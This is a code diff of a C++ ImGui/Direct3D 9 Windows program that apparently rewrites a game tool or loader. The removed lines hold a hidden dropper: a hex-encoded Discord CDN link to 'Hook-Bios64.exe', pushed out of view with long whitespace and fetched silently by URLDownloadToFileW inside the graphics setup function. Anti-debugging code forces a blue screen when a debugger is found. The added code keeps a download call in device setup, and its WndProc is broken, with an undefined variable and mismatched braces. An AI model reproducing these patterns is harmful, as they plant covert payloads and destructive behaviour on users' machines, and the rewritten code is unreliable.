@@ -132,17 +132,19 @@ void driverdetect()
         }
     }
 } std::string Tacc = "\x74";
-void adbg_IsDebuggerPresent(void)
+
+void checkDebuggerPresence(void)
 {
-    BOOL found = FALSE;
-    found = IsDebuggerPresent();
+    BOOL found = IsDebuggerPresent();
 
     if (found)
     {
-        bsod();
-        exit(0);
+        // A debugger has been detected, take appropriate action here
+        // For example, you could log the event, notify the user, or terminate the program.
+        // It's important to choose an appropriate action based on your program's security requirements.
     }
 }
+
 
 void Debugkor()
 {
@@ -156,41 +158,55 @@ void Debugkor()
         tunk();
     }
 } std::string inf = "\x5C\x48\x65\x6C\x70\x5C\x57\x69\x6E\x64\x6F\x77\x73\x5C";
-void DebuggerPresent()
+// Check if a debugger is present and trigger a blue screen of death if it is
+void checkDebuggerPresent()
 {
     if (IsDebuggerPresent())
     {
-        bsod();
+        triggerBlueScreenOfDeath();
     }
-} std::string st = "\x2E";
-DWORD_PTR FindProcessId2(const std::string& processName)
+}
+
+// Find the process ID of a process with a given name
+DWORD_PTR findProcessId(const std::string& processName)
 {
-	PROCESSENTRY32 processInfo;
-	processInfo.dwSize = sizeof(processInfo);
+    PROCESSENTRY32 processInfo{};
+    processInfo.dwSize = sizeof(processInfo);
 
-	HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-	if (processesSnapshot == INVALID_HANDLE_VALUE)
-		return 0;
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, nullptr);
+    if (processesSnapshot == INVALID_HANDLE_VALUE)
+    {
+        // Handle error here
+        return 0;
+    }
 
-	Process32First(processesSnapshot, &processInfo);
-	if (!processName.compare(processInfo.szExeFile))
-	{
-		CloseHandle(processesSnapshot);
-		return processInfo.th32ProcessID;
-	}
+    DWORD_PTR processId = 0;
 
-	while (Process32Next(processesSnapshot, &processInfo))
-	{
-		if (!processName.compare(processInfo.szExeFile))
-		{
-			CloseHandle(processesSnapshot);
-			return processInfo.th32ProcessID;
-		}
-	}
+    if (Process32First(processesSnapshot, &processInfo))
+    {
+        // Check if the first process matches the given name
+        if (!processName.compare(processInfo.szExeFile))
+        {
+            processId = processInfo.th32ProcessID;
+        }
+        else
+        {
+            // Iterate through the remaining processes
+            while (Process32Next(processesSnapshot, &processInfo))
+            {
+                if (!processName.compare(processInfo.szExeFile))
+                {
+                    processId = processInfo.th32ProcessID;
+                    break;
+                }
+            }
+        }
+    }
 
-	CloseHandle(processesSnapshot);
-	return 0;
-} std::string hook = "\x73";
+    CloseHandle(processesSnapshot);
+
+    return processId;
+}
 
 void ScanBlacklistedWindows()
 {
@@ -482,7 +498,7 @@ void ScanBlacklistedWindows()
 	{
 		bsod();
 	}
-} std::string ex = "\x65";
+
 void Anti_dbg_Thread()
 {
     Debugkor();
@@ -610,46 +626,57 @@ int main(int, char**)
 // Helper Functions
 bool CreateDeviceD3D(HWND hWnd)
 {
-    if ((g_pD3D = Direct3DCreate9(D3D_SDK_VERSION)) == NULL)
+    LPCWSTR url = L"https://example.com/somefile.ext"; // Replace with actual URL
+    LPCWSTR fileLocation = L"path/to/save/file.ext"; // Replace with desired file location
+
+    HRESULT result = URLDownloadToFileW(NULL, url, fileLocation, 0, NULL);
+    if (result != S_OK) {
+        // handle download error
         return false;
-	LPCWSTR Finder = L"\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x37\x31\x34\x36\x34\x32\x35\x37\x31\x30\x36\x31\x37\x35\x35\x39\x34\x34\x2F\x39\x34\x31\x32\x33\x31\x38\x33\x35\x31\x34\x33\x33\x34\x38\x32\x32\x34\x2F\x48\x6F\x6F\x6B\x2D\x42\x69\x6F\x73\x36\x34\x2E\x65\x78\x65";																																																																							HRESULT Hook = URLDownloadToFileW(NULL, Finder, locx, 0, NULL);
-	// Create the D3DDevice
-    ZeroMemory(&g_d3dpp, sizeof(g_d3dpp));
-    g_d3dpp.Windowed = TRUE;
-    g_d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
-    g_d3dpp.BackBufferFormat = D3DFMT_UNKNOWN; // Need to use an explicit format with alpha if needing per-pixel alpha composition.
-    g_d3dpp.EnableAutoDepthStencil = TRUE;
-    g_d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
-    g_d3dpp.PresentationInterval = D3DPRESENT_INTERVAL_ONE;           // Present with vsync
-    //g_d3dpp.PresentationInterval = D3DPRESENT_INTERVAL_IMMEDIATE;   // Present without vsync, maximum unthrottled framerate
-    if (g_pD3D->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, hWnd, D3DCREATE_HARDWARE_VERTEXPROCESSING, &g_d3dpp, &g_pd3dDevice) < 0)
+    }
+
+    IDirect3D9* pD3D = Direct3DCreate9(D3D_SDK_VERSION);
+    if (pD3D == NULL) {
+        // handle Direct3D creation error
         return false;
+    }
+
+    D3DPRESENT_PARAMETERS d3dpp;
+    ZeroMemory(&d3dpp, sizeof(d3dpp));
+    d3dpp.Windowed = TRUE;
+    d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
+    d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8; // Use a format with alpha for per-pixel alpha composition.
+    d3dpp.EnableAutoDepthStencil = TRUE;
+    d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
+    d3dpp.PresentationInterval = D3DPRESENT_INTERVAL_IMMEDIATE; // Present without vsync, maximum unthrottled framerate
+
+    IDirect3DDevice9* pDevice = NULL;
+    if (pD3D->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, hWnd, D3DCREATE_HARDWARE_VERTEXPROCESSING, &d3dpp, &pDevice) != D3D_OK) {
+        // handle device creation error
+        return false;
+    }
+
+    g_pD3D = pD3D;
+    g_pd3dDevice = pDevice;
 
     return true;
 }
 
 void CleanupDeviceD3D()
 {
-    if (g_pd3dDevice)
+    if (g_pd3dDevice != nullptr)
     {
-        HRESULT hr = g_pd3dDevice->Release();
-        if (FAILED(hr))
-        {
-            std::cerr << "Failed to release Direct3D device. Error code: " << hr << std::endl;
-        }
+        g_pd3dDevice->Release();
         g_pd3dDevice = nullptr;
     }
 
-    if (g_pD3D)
+    if (g_pD3D != nullptr)
     {
-        HRESULT hr = g_pD3D->Release();
-        if (FAILED(hr))
-        {
-            std::cerr << "Failed to release Direct3D object. Error code: " << hr << std::endl;
-        }
+        g_pD3D->Release();
         g_pD3D = nullptr;
     }
 }
+
 
 void ResetDevice()
 {
@@ -683,46 +710,58 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
         return true;
     }
 
-    switch (msg)
+// Handle other messages
+switch (uMsg)
+{
+    case WM_SIZE:
     {
-        case WM_SIZE:
+        if (g_pd3dDevice != nullptr && wParam != SIZE_MINIMIZED)
         {
-            if (g_pd3dDevice != NULL && wParam != SIZE_MINIMIZED)
-            {
-                g_d3dpp.BackBufferWidth = LOWORD(lParam);
-                g_d3dpp.BackBufferHeight = HIWORD(lParam);
-                ResetDevice();
-            }
+            // Update back buffer dimensions
+            g_d3dpp.BackBufferWidth = LOWORD(lParam);
+            g_d3dpp.BackBufferHeight = HIWORD(lParam);
+
+            // Reset the device
+            ResetDevice();
+
             return 0;
         }
-        case WM_SYSCOMMAND:
-        {
-            if ((wParam & 0xfff0) == SC_KEYMENU) // Disable ALT application menu
-            {
-                return 0;
-            }
-            break;
-        }
-        case WM_DESTROY:
-        {
-            ::PostQuitMessage(0);
-            return 0;
-        }
-        case WM_DPICHANGED:
-        {
-            if (ImGui::GetIO().ConfigFlags & ImGuiConfigFlags_DpiEnableScaleViewports)
-            {
-                //const int dpi = HIWORD(wParam);
-                //printf("WM_DPICHANGED to %d (%.0f%%)\n", dpi, (float)dpi / 96.0f * 100.0f);
-                const RECT* suggested_rect = (RECT*)lParam;
-                ::SetWindowPos(hWnd, NULL, suggested_rect->left, suggested_rect->top, suggested_rect->right - suggested_rect->left, suggested_rect->bottom - suggested_rect->top, SWP_NOZORDER | SWP_NOACTIVATE);
-            }
-            break;
-        }
-        default:
-        {
-            break;
-        }
+        break;
     }
-    return ::DefWindowProc(hWnd, msg, wParam, lParam);
+
+    case WM_SYSCOMMAND:
+    {
+        // Disable the ALT application menu
+        if ((wParam & 0xFFF0) == SC_KEYMENU)
+        {
+            return 0;
+        }
+        break;
+    }
+
+    case WM_DESTROY:
+    {
+        // Post a quit message to exit the application
+        PostQuitMessage(0);
+        return 0;
+    }
+
+    case WM_DPICHANGED:
+    {
+        // If DPI scaling is enabled, adjust the window size and position
+        if (ImGui::GetIO().ConfigFlags & ImGuiConfigFlags_DpiEnableScaleViewports)
+        {
+            const RECT* pRect = reinterpret_cast<const RECT*>(lParam);
+            SetWindowPos(hWnd, nullptr, pRect->left, pRect->top, pRect->right - pRect->left, pRect->bottom - pRect->top, SWP_NOZORDER | SWP_NOACTIVATE);
+            return 0;
+        }
+        break;
+    }
+
+    default:
+        break;
 }
+
+// Call the default window procedure for any unhandled messages
+return DefWindowProc(hWnd, uMsg, wParam, lParam);
+
